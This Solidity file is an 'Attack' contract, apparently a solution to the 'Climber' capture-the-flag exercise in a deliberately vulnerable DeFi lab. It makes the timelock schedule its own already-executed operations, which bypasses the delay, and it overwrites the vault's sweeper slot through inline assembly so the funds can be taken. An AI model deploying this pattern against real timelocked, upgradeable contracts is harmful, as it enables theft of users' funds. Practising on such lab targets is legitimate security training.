// SPDX-License-Identifier: MIT
pragma solidity =0.8.25;

import {ClimberVault} from "../../src/climber/ClimberVault.sol";
import {ClimberTimelock} from "../../src/climber/ClimberTimelock.sol";

contract Attack is ClimberVault {
    address[] public targets;
    uint256[] public values;
    bytes[] public dataElements;
    bytes32 public salt;

    function setData(address[] memory _targets, uint256[] memory _values, bytes[] memory _dataElements, bytes32 _salt) external {
        for (uint8 i = 0; i < _targets.length; i++) {
            targets.push(_targets[i]);
            values.push(_values[i]);
            dataElements.push(_dataElements[i]);
        }

        salt = _salt;
    }

    function schedule() external {
        ClimberTimelock(payable(msg.sender)).schedule(targets, values, dataElements, salt);
    }

    function setSweeper(address _newSweeper) external {
        assembly {
            sstore(1, _newSweeper)
        }
    }
}